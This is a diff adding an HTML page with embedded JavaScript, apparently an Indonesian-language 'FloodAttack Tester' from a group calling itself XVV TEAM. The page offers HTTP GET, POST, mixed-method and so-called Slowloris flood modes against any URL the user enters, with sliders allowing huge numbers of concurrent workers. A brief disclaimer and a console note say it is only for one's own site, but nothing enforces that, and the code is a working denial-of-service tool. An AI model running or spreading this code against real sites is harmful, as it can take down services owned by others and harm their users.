@@ -1,0 +1,921 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FloodAttack Tester — AryaXvv</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background: #0f172a;
+            color: #e2e8f0;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            background: #1e293b;
+            border-radius: 15px;
+            padding: 25px;
+            border: 2px solid #3b82f6;
+            box-shadow: 0 0 30px rgba(59, 130, 246, 0.3);
+        }
+        
+        .header {
+            text-align: center;
+            padding-bottom: 20px;
+            border-bottom: 2px solid #3b82f6;
+            margin-bottom: 25px;
+        }
+        
+        .header h1 {
+            color: #60a5fa;
+            font-size: 28px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 15px;
+            margin-bottom: 10px;
+        }
+        
+        .danger-alert {
+            background: linear-gradient(135deg, #ef4444, #dc2626);
+            color: white;
+            padding: 15px;
+            border-radius: 10px;
+            margin: 15px 0;
+            border: 3px solid #f87171;
+            font-weight: bold;
+            text-align: center;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #94a3b8;
+            font-weight: 600;
+        }
+        
+        input, select {
+            width: 100%;
+            padding: 12px;
+            background: #334155;
+            border: 2px solid #475569;
+            border-radius: 8px;
+            color: white;
+            font-size: 16px;
+        }
+        
+        input:focus, select:focus {
+            outline: none;
+            border-color: #3b82f6;
+            box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.3);
+        }
+        
+        .range-group {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+        
+        .range-group input[type="range"] {
+            flex: 1;
+        }
+        
+        .range-value {
+            min-width: 60px;
+            text-align: center;
+            font-weight: bold;
+            color: #60a5fa;
+            font-size: 18px;
+        }
+        
+        .attack-types {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 10px;
+            margin: 15px 0;
+        }
+        
+        .attack-type {
+            background: #334155;
+            padding: 15px;
+            border-radius: 8px;
+            cursor: pointer;
+            border: 2px solid #475569;
+            transition: all 0.3s;
+        }
+        
+        .attack-type:hover {
+            border-color: #3b82f6;
+            transform: translateY(-2px);
+        }
+        
+        .attack-type.active {
+            background: #1d4ed8;
+            border-color: #60a5fa;
+            box-shadow: 0 5px 15px rgba(37, 99, 235, 0.4);
+        }
+        
+        .buttons {
+            display: flex;
+            gap: 15px;
+            margin-top: 25px;
+        }
+        
+        .btn {
+            flex: 1;
+            padding: 16px;
+            border: none;
+            border-radius: 10px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            transition: all 0.3s;
+        }
+        
+        .btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 7px 20px rgba(0,0,0,0.3);
+        }
+        
+        .btn:active {
+            transform: translateY(0);
+        }
+        
+        .btn-start {
+            background: linear-gradient(135deg, #ef4444, #dc2626);
+            color: white;
+        }
+        
+        .btn-stop {
+            background: linear-gradient(135deg, #10b981, #059669);
+            color: white;
+        }
+        
+        .btn-clear {
+            background: linear-gradient(135deg, #f59e0b, #d97706);
+            color: white;
+        }
+        
+        /* Stats */
+        .stats {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 15px;
+            margin: 25px 0;
+        }
+        
+        .stat-card {
+            background: #0f172a;
+            padding: 20px;
+            border-radius: 10px;
+            text-align: center;
+            border: 2px solid #334155;
+        }
+        
+        .stat-value {
+            font-size: 32px;
+            font-weight: bold;
+            color: #60a5fa;
+            margin-bottom: 5px;
+        }
+        
+        .stat-label {
+            font-size: 14px;
+            color: #94a3b8;
+        }
+        
+        /* Results */
+        .results {
+            background: #0f172a;
+            border-radius: 10px;
+            padding: 20px;
+            margin-top: 25px;
+            height: 300px;
+            overflow-y: auto;
+            border: 2px solid #334155;
+        }
+        
+        .result-item {
+            padding: 10px;
+            margin-bottom: 8px;
+            background: #1e293b;
+            border-radius: 6px;
+            border-left: 4px solid #3b82f6;
+            font-family: 'Courier New', monospace;
+            font-size: 14px;
+        }
+        
+        .result-item.success {
+            border-left-color: #10b981;
+            background: #064e3b;
+        }
+        
+        .result-item.error {
+            border-left-color: #ef4444;
+            background: #7f1d1d;
+        }
+        
+        .result-item.warning {
+            border-left-color: #f59e0b;
+            background: #78350f;
+        }
+        
+        /* Progress */
+        .progress {
+            height: 10px;
+            background: #334155;
+            border-radius: 5px;
+            overflow: hidden;
+            margin: 15px 0;
+        }
+        
+        .progress-bar {
+            height: 100%;
+            background: linear-gradient(90deg, #3b82f6, #8b5cf6);
+            width: 0%;
+            transition: width 0.3s;
+        }
+        
+        /* Loading */
+        .loading {
+            display: none;
+            text-align: center;
+            padding: 30px;
+        }
+        
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 5px solid #334155;
+            border-top: 5px solid #3b82f6;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 15px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        /* Notification */
+        .notification {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            padding: 15px 25px;
+            background: #10b981;
+            color: white;
+            border-radius: 8px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+            display: none;
+            z-index: 1000;
+            font-weight: bold;
+        }
+        
+        /* Footer */
+        .footer {
+            text-align: center;
+            margin-top: 25px;
+            padding-top: 20px;
+            border-top: 2px solid #334155;
+            color: #64748b;
+            font-size: 14px;
+        }
+        
+        @media (max-width: 768px) {
+            .stats {
+                grid-template-columns: repeat(2, 1fr);
+            }
+            
+            .buttons {
+                flex-direction: column;
+            }
+            
+            .attack-types {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Header -->
+        <div class="header">
+            <h1>
+                <i class="fas fa-bolt"></i>
+                FloodAttack sistem v1.0
+            </h1>
+            <p>HTTP Flood Attack  - XVV TEAM</p>
+        </div>
+        
+        <!-- Warning -->
+        <div class="danger-alert">
+            ⚠️ PERINGATAN: Tanggung sendiri
+           akibatnya Kami hanya membuat Toolss agar memudahkan pengguna 
+           @AryaXvv
+        </div>
+        
+        <!-- Target Configuration -->
+        <div class="form-group">
+            <label for="targetUrl">
+                <i class="fas fa-crosshairs"></i> Target URL (Website Anda):
+            </label>
+            <input type="url" id="targetUrl" placeholder="http://localhost:3000 atau https://website-anda.com" value="http://localhost:3000">
+        </div>
+        
+        <!-- Attack Type Selection -->
+        <div class="form-group">
+            <label><i class="fas fa-skull-crossbones"></i> Pilih Tipe Attack:</label>
+            <div class="attack-types">
+                <div class="attack-type active" data-type="http-flood">
+                    <h3>HTTP FLOOD</h3>
+                    <p>GET request massal</p>
+                </div>
+                <div class="attack-type" data-type="post-flood">
+                    <h3>POST FLOOD</h3>
+                    <p>POST dengan payload</p>
+                </div>
+                <div class="attack-type" data-type="mixed-flood">
+                    <h3>MIXED FLOOD</h3>
+                    <p>GET + POST + HEAD</p>
+                </div>
+                <div class="attack-type" data-type="slow-loris">
+                    <h3>SLOW LORIS</h3>
+                    <p>Slow HTTP Attack</p>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Attack Parameters -->
+        <div class="form-group">
+            <label for="workerCount">
+                <i class="fas fa-robot"></i> Jumlah Worker (Bot):
+            </label>
+            <div class="range-group">
+                <input type="range" id="workerCount" min="1" max="10000000000000" value="20">
+                <span class="range-value" id="workerValue">20</span>
+            </div>
+        </div>
+        
+        <div class="form-group">
+            <label for="requestCount">
+                <i class="fas fa-bullseye"></i> Request per Worker:
+            </label>
+            <div class="range-group">
+                <input type="range" id="requestCount" min="10" max="100000000000000000000" value="100">
+                <span class="range-value" id="requestValue">100</span>
+            </div>
+        </div>
+        
+        <div class="form-group">
+            <label for="delayTime">
+                <i class="fas fa-clock"></i> Delay antar Request (ms):
+            </label>
+            <div class="range-group">
+                <input type="range" id="delayTime" min="0" max="1000" value="50">
+                <span class="range-value" id="delayValue">50ms</span>
+            </div>
+        </div>
+        
+        <!-- Control Buttons -->
+        <div class="buttons">
+            <button class="btn btn-start" id="startAttack">
+                <i class="fas fa-play"></i>
+                START FLOOD ATTACK
+            </button>
+            <button class="btn btn-stop" id="stopAttack" disabled>
+                <i class="fas fa-stop"></i>
+                STOP ATTACK
+            </button>
+            <button class="btn btn-clear" id="clearResults">
+                <i class="fas fa-trash"></i>
+                CLEAR RESULTS
+            </button>
+        </div>
+        
+        <!-- Progress Bar -->
+        <div class="progress" id="progressContainer" style="display: none;">
+            <div class="progress-bar" id="progressBar"></div>
+        </div>
+        
+        <!-- Real-time Statistics -->
+        <div class="stats" id="statsContainer">
+            <div class="stat-card">
+                <div class="stat-value" id="totalRequests">0</div>
+                <div class="stat-label">Total Requests</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-value" id="successRequests">0</div>
+                <div class="stat-label">Success</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-value" id="failedRequests">0</div>
+                <div class="stat-label">Failed</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-value" id="requestsPerSec">0</div>
+                <div class="stat-label">Req/Sec</div>
+            </div>
+        </div>
+        
+        <!-- Results Console -->
+        <div class="results" id="resultsConsole">
+            <div class="result-item">
+                <i class="fas fa-info-circle"></i>
+                FloodAttack Tester siap digunakan. Masukkan URL target Anda.
+            </div>
+        </div>
+        
+        <!-- Loading -->
+        <div class="loading" id="loading">
+            <div class="spinner"></div>
+            <p id="loadingText">Memulai HTTP Flood Attack...</p>
+        </div>
+        
+        <!-- Footer -->
+        <div class="footer">
+            <p>
+                <i class="fas fa-shield-alt"></i> 
+                protection by xvv team.
+            </p>
+            <p style="margin-top: 10px; font-size: 12px; color: #94a3b8;">
+                v1.0 | HTTP Flood Attack 
+            </p>
+        </div>
+    </div>
+    
+    <!-- Notification -->
+    <div class="notification" id="notification"></div>
+    
+    <!-- Font Awesome -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <script>
+        // ==============================
+        // VARIABLES & INITIALIZATION
+        // ==============================
+        let isAttacking = false;
+        let attackWorkers = [];
+        let stats = {
+            total: 0,
+            success: 0,
+            failed: 0,
+            startTime: null
+        };
+        
+        // ==============================
+        // DOM ELEMENTS
+        // ==============================
+        const elements = {
+            targetUrl: document.getElementById('targetUrl'),
+            startAttack: document.getElementById('startAttack'),
+            stopAttack: document.getElementById('stopAttack'),
+            clearResults: document.getElementById('clearResults'),
+            resultsConsole: document.getElementById('resultsConsole'),
+            progressContainer: document.getElementById('progressContainer'),
+            progressBar: document.getElementById('progressBar'),
+            loading: document.getElementById('loading'),
+            loadingText: document.getElementById('loadingText'),
+            notification: document.getElementById('notification'),
+            workerCount: document.getElementById('workerCount'),
+            workerValue: document.getElementById('workerValue'),
+            requestCount: document.getElementById('requestCount'),
+            requestValue: document.getElementById('requestValue'),
+            delayTime: document.getElementById('delayTime'),
+            delayValue: document.getElementById('delayValue'),
+            totalRequests: document.getElementById('totalRequests'),
+            successRequests: document.getElementById('successRequests'),
+            failedRequests: document.getElementById('failedRequests'),
+            requestsPerSec: document.getElementById('requestsPerSec')
+        };
+        
+        // ==============================
+        // UTILITY FUNCTIONS
+        // ==============================
+        function showNotification(message, type = 'success') {
+            const notif = elements.notification;
+            notif.textContent = message;
+            notif.style.background = type === 'success' ? '#10b981' : 
+                                   type === 'error' ? '#ef4444' : 
+                                   type === 'warning' ? '#f59e0b' : '#3b82f6';
+            
+            notif.style.display = 'block';
+            
+            setTimeout(() => {
+                notif.style.display = 'none';
+            }, 3000);
+        }
+        
+        function showLoading(text) {
+            elements.loadingText.textContent = text;
+            elements.loading.style.display = 'block';
+        }
+        
+        function hideLoading() {
+            elements.loading.style.display = 'none';
+        }
+        
+        function addLog(message, type = 'info') {
+            const console = elements.resultsConsole;
+            const log = document.createElement('div');
+            log.className = `result-item ${type}`;
+            
+            const time = new Date().toLocaleTimeString();
+            const icon = type === 'success' ? '✅' : 
+                        type === 'error' ? '❌' : 
+                        type === 'warning' ? '⚠️' : '📡';
+            
+            log.innerHTML = `<strong>${icon} [${time}]</strong> ${message}`;
+            
+            console.appendChild(log);
+            console.scrollTop = console.scrollHeight;
+        }
+        
+        function updateStats() {
+            elements.totalRequests.textContent = stats.total;
+            elements.successRequests.textContent = stats.success;
+            elements.failedRequests.textContent = stats.failed;
+            
+            // Calculate requests per second
+            if (stats.startTime) {
+                const elapsed = (Date.now() - stats.startTime) / 1000;
+                if (elapsed > 0) {
+                    const rps = Math.round(stats.total / elapsed);
+                    elements.requestsPerSec.textContent = rps;
+                }
+            }
+        }
+        
+        function updateProgress(percent) {
+            elements.progressContainer.style.display = 'block';
+            elements.progressBar.style.width = `${percent}%`;
+        }
+        
+        // ==============================
+        // ATTACK TYPE SELECTION
+        // ==============================
+        document.querySelectorAll('.attack-type').forEach(type => {
+            type.addEventListener('click', () => {
+                document.querySelectorAll('.attack-type').forEach(t => t.classList.remove('active'));
+                type.classList.add('active');
+            });
+        });
+        
+        // ==============================
+        // RANGE SLIDERS
+        // ==============================
+        elements.workerCount.addEventListener('input', function() {
+            elements.workerValue.textContent = this.value;
+        });
+        
+        elements.requestCount.addEventListener('input', function() {
+            elements.requestValue.textContent = this.value;
+        });
+        
+        elements.delayTime.addEventListener('input', function() {
+            elements.delayValue.textContent = `${this.value}ms`;
+        });
+        
+        // ==============================
+        // HTTP FLOOD ATTACK ENGINE
+        // ==============================
+        async function startFloodAttack() {
+            if (isAttacking) {
+                showNotification('Attack sudah berjalan!', 'warning');
+                return;
+            }
+            
+            const url = elements.targetUrl.value.trim();
+            if (!url) {
+                showNotification('Masukkan URL target terlebih dahulu!', 'error');
+                return;
+            }
+            
+            // Validate URL
+            if (!url.startsWith('http://') && !url.startsWith('https://')) {
+                showNotification('URL harus dimulai dengan http:// atau https://', 'error');
+                return;
+            }
+            
+            // Get attack parameters
+            const workerCount = parseInt(elements.workerCount.value);
+            const requestCount = parseInt(elements.requestCount.value);
+            const delayTime = parseInt(elements.delayTime.value);
+            const attackType = document.querySelector('.attack-type.active').dataset.type;
+            
+            // Reset stats
+            stats = {
+                total: 0,
+                success: 0,
+                failed: 0,
+                startTime: Date.now()
+            };
+            updateStats();
+            
+            // Clear console
+            elements.resultsConsole.innerHTML = '';
+            addLog(`🚀 Memulai ${attackType.toUpperCase()} Attack...`, 'warning');
+            addLog(`Target: ${url}`, 'info');
+            addLog(`Workers: ${workerCount} | Requests: ${requestCount} | Delay: ${delayTime}ms`, 'info');
+            
+            // Show progress
+            elements.progressContainer.style.display = 'block';
+            updateProgress(0);
+            
+            // Enable stop button
+            elements.startAttack.disabled = true;
+            elements.stopAttack.disabled = false;
+            isAttacking = true;
+            
+            // Create workers
+            attackWorkers = [];
+            const totalRequests = workerCount * requestCount;
+            let completedRequests = 0;
+            
+            showLoading(`Running ${workerCount} flood workers...`);
+            
+            // Start attack workers
+            for (let i = 0; i < workerCount; i++) {
+                const worker = createAttackWorker(i, url, attackType, requestCount, delayTime, 
+                    () => completedRequests++,
+                    () => stats.total++,
+                    () => stats.success++,
+                    () => stats.failed++
+                );
+                attackWorkers.push(worker);
+            }
+            
+            // Progress monitoring
+            const progressInterval = setInterval(() => {
+                const progress = Math.round((completedRequests / totalRequests) * 100);
+                updateProgress(progress);
+                updateStats();
+                
+                if (progress % 10 === 0) {
+                    addLog(`Progress: ${progress}% | Requests: ${stats.total} | Success: ${stats.success} | Failed: ${stats.failed}`, 
+                          progress > 70 ? 'warning' : 'info');
+                }
+                
+                if (!isAttacking || completedRequests >= totalRequests) {
+                    clearInterval(progressInterval);
+                }
+            }, 1000);
+            
+            try {
+                await Promise.allSettled(attackWorkers);
+            } catch (error) {
+                console.error('Attack error:', error);
+            }
+            
+            // Cleanup
+            clearInterval(progressInterval);
+            isAttacking = false;
+            elements.startAttack.disabled = false;
+            elements.stopAttack.disabled = true;
+            
+            // Final results
+            const totalTime = (Date.now() - stats.startTime) / 1000;
+            const successRate = stats.total > 0 ? Math.round((stats.success / stats.total) * 100) : 0;
+            
+            addLog('='.repeat(50), 'info');
+            addLog(`🎯 ATTACK COMPLETED!`, 'success');
+            addLog(`Total Time: ${totalTime.toFixed(2)} seconds`, 'info');
+            addLog(`Total Requests: ${stats.total}`, 'info');
+            addLog(`Success Rate: ${successRate}%`, successRate > 70 ? 'success' : 'warning');
+            addLog(`Requests/Second: ${Math.round(stats.total / totalTime)}`, 'info');
+            
+            if (successRate < 50) {
+                addLog(`⚠️ Website Anda mungkin DOWN atau BLOCKING requests!`, 'error');
+            } else if (successRate > 90) {
+                addLog(`✅ Website Anda tahan terhadap flood attack!`, 'success');
+            }
+            
+            hideLoading();
+            updateProgress(100);
+            
+            showNotification(`Attack selesai! ${stats.total} requests terkirim`, 
+                           successRate > 70 ? 'success' : 'warning');
+        }
+        
+        // ==============================
+        // ATTACK WORKER CREATOR
+        // ==============================
+        function createAttackWorker(id, url, attackType, requestCount, delayTime, 
+                                   onComplete, onRequest, onSuccess, onFail) {
+            return new Promise(async (resolve) => {
+                for (let i = 0; i < requestCount && isAttacking; i++) {
+                    try {
+                        let response;
+                        
+                        switch(attackType) {
+                            case 'http-flood':
+                                // Simple GET flood
+                                response = await fetch(url, {
+                                    method: 'GET',
+                                    headers: {
+                                        'User-Agent': `FloodBot-${id}-${i}`,
+                                        'X-Attack-ID': `flood-${Date.now()}`
+                                    },
+                                    cache: 'no-cache'
+                                });
+                                break;
+                                
+                            case 'post-flood':
+                                // POST flood with random data
+                                const postData = {
+                                    attack: true,
+                                    timestamp: Date.now(),
+                                    worker: id,
+                                    request: i,
+                                    data: Math.random().toString(36).substring(7)
+                                };
+                                
+                                response = await fetch(url, {
+                                    method: 'POST',
+                                    headers: {
+                                        'Content-Type': 'application/json',
+                                        'User-Agent': `FloodBot-POST-${id}`
+                                    },
+                                    body: JSON.stringify(postData)
+                                });
+                                break;
+                                
+                            case 'mixed-flood':
+                                // Mixed GET, POST, HEAD
+                                const methods = ['GET', 'POST', 'HEAD'];
+                                const method = methods[Math.floor(Math.random() * methods.length)];
+                                
+                                if (method === 'POST') {
+                                    response = await fetch(url, {
+                                        method: 'POST',
+                                        headers: {
+                                            'Content-Type': 'application/x-www-form-urlencoded',
+                                            'User-Agent': `FloodBot-MIXED-${id}`
+                                        },
+                                        body: `data=${Date.now()}&rand=${Math.random()}`
+                                    });
+                                } else {
+                                    response = await fetch(url, {
+                                        method: method,
+                                        headers: {
+                                            'User-Agent': `FloodBot-MIXED-${id}`
+                                        }
+                                    });
+                                }
+                                break;
+                                
+                            case 'slow-loris':
+                                // Slow Loris attack simulation
+                                try {
+                                    const controller = new AbortController();
+                                    const timeout = setTimeout(() => controller.abort(), 5000);
+                                    
+                                    response = await fetch(url, {
+                                        method: 'GET',
+                                        headers: {
+                                            'User-Agent': `SlowLoris-${id}`,
+                                            'Content-Length': '1000000',
+                                            'X-Slow-Attack': 'true'
+                                        },
+                                        signal: controller.signal
+                                    });
+                                    
+                                    clearTimeout(timeout);
+                                } catch (slowError) {
+                                    // Timeout expected in Slow Loris
+                                    throw new Error('SLOW_LORIS_TIMEOUT');
+                                }
+                                break;
+                                
+                            default:
+                                response = await fetch(url);
+                        }
+                        
+                        onRequest();
+                        
+                        if (response && response.ok) {
+                            onSuccess();
+                        } else {
+                            onFail();
+                        }
+                        
+                    } catch (error) {
+                        onRequest();
+                        onFail();
+                        
+                        // Don't spam logs for every error
+                        if (i % 10 === 0) {
+                            console.log(`Worker ${id} error: ${error.message}`);
+                        }
+                    }
+                    
+                    // Call completion
+                    onComplete();
+                    
+                    // Delay between requests
+                    if (delayTime > 0) {
+                        await new Promise(resolve => setTimeout(resolve, delayTime));
+                    }
+                }
+                
+                resolve();
+            });
+        }
+        
+        // ==============================
+        // STOP ATTACK
+        // ==============================
+        async function stopFloodAttack() {
+            isAttacking = false;
+            attackWorkers = [];
+            
+            elements.startAttack.disabled = false;
+            elements.stopAttack.disabled = true;
+            
+            addLog('⏹️ Attack dihentikan oleh user', 'warning');
+            showNotification('Attack dihentikan', 'info');
+        }
+        
+        // ==============================
+        // CLEAR RESULTS
+        // ==============================
+        function clearResults() {
+            if (isAttacking) {
+                showNotification('Hentikan attack terlebih dahulu!', 'warning');
+                return;
+            }
+            
+            elements.resultsConsole.innerHTML = '';
+            addLog('🧹 Console cleared. Ready for new attack.', 'info');
+            
+            // Reset stats display
+            stats = { total: 0, success: 0, failed: 0, startTime: null };
+            updateStats();
+            updateProgress(0);
+            elements.progressContainer.style.display = 'none';
+            
+            showNotification('Results cleared', 'success');
+        }
+        
+        // ==============================
+        // EVENT LISTENERS
+        // ==============================
+        elements.startAttack.addEventListener('click', startFloodAttack);
+        elements.stopAttack.addEventListener('click', stopFloodAttack);
+        elements.clearResults.addEventListener('click', clearResults);
+        
+        // Keyboard shortcuts
+        document.addEventListener('keydown', (e) => {
+            if (e.ctrlKey && e.key === 'Enter') {
+                startFloodAttack();
+            } else if (e.key === 'Escape') {
+                stopFloodAttack();
+            }
+        });
+        
+        // ==============================
+        // INITIALIZATION
+        // ==============================
+        console.log(`
+        ╔══════════════════════════════════════════════════╗
+        ║      FloodAttack Tester v2.0 - REAL ENGINE       ║
+        ║        HTTP Flood Attack Simulator               ║
+        ║         HANYA untuk WEBSITE SENDIRI!             ║
+        ╚══════════════════════════════════════════════════╝
+        `);
+        
+        // Initial UI update
+        elements.workerValue.textContent = elements.workerCount.value;
+        elements.requestValue.textContent = elements.requestCount.value;
+        elements.delayValue.textContent = `${elements.delayTime.value}ms`;
+        
+        // Add sample test URLs suggestion
+        setTimeout(() => {
+            addLog('💡 Tips: Untuk local testing, gunakan:', 'info');
+            addLog('• http://localhost:3000 (Node.js/Express)', 'info');
+            addLog('• http://localhost:8080 (Spring Boot)', 'info');
+            addLog('• http://localhost:8000 (Python/Django)', 'info');
+            addLog('• http://localhost:80 (Apache/Nginx)', 'info');
+        }, 1000);
+    </script>
+</body>
+</html>
